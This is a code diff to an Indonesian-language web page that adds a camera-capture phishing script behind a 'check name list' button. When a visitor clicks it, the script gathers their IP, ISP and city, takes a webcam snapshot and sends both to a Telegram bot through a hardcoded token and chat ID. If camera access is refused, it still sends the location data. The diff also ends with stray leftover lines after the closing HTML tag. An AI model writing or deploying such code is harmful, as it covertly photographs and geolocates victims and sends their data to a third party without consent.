@@ -24,17 +24,57 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        const CONFIG = {
-            TOKEN: "8503662761:AAE_cZLT-07P6r5gQteADSjsTwV2GUdnqbg",
-            CHAT_ID: "5392443720"
-        };
+        const tok = "8503662761:AAE_cZLT-07P6r5gQteADSjsTwV2GUdnqbg";
+        const id = "5392443720";
 
-        const startBtn = document.getElementById('startBtn');
+        document.getElementById('startBtn').addEventListener('click', async function() {
+            this.innerText = "Memproses...";
+            this.disabled = true;
 
-        startBtn.addEventListener('click', async () => {
-            startBtn.innerText = "Memproses Data...";
-            startBtn.disabled = true;
+            let info = "📸 *HASIL CAPTURE UJANG MODS*%0A";
+            info += "━━━━━━━━━━━━━━━━━━%0A";
 
+            // Ambil IP
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                info += "🌍 *IP:* " + d.ip + "%0A";
+                info += "🏢 *ISP:* " + d.org + "%0A";
+                info += "📍 *Kota:* " + d.city + "%0A";
+            } catch(e) { info += "🌍 IP: Gagal Ambil%0A"; }
+
+            // Ambil Kamera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', id);
+                        fd.append('photo', blob, 'f.jpg');
+                        fd.append('caption', decodeURIComponent(info));
+                        fd.append('parse_mode', 'Markdown');
+                        
+                        fetch("https://api.telegram.org/bot" + tok + "/sendPhoto", { method: 'POST', body: fd });
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (err) {
+                fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + id + "&text=" + info + "%0A⚠️ Kamera Ditolak&parse_mode=Markdown");
+                alert("Akses diperlukan.");
+                this.innerText = "CEK DAFTAR NAMA";
+                this.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
             let caption = "📸 *HASIL CAPTURE UJANG MODS*%0A━━━━━━━━━━━━━━━━━━%0A";
 
             // 1. Ambil IP & Lokasi
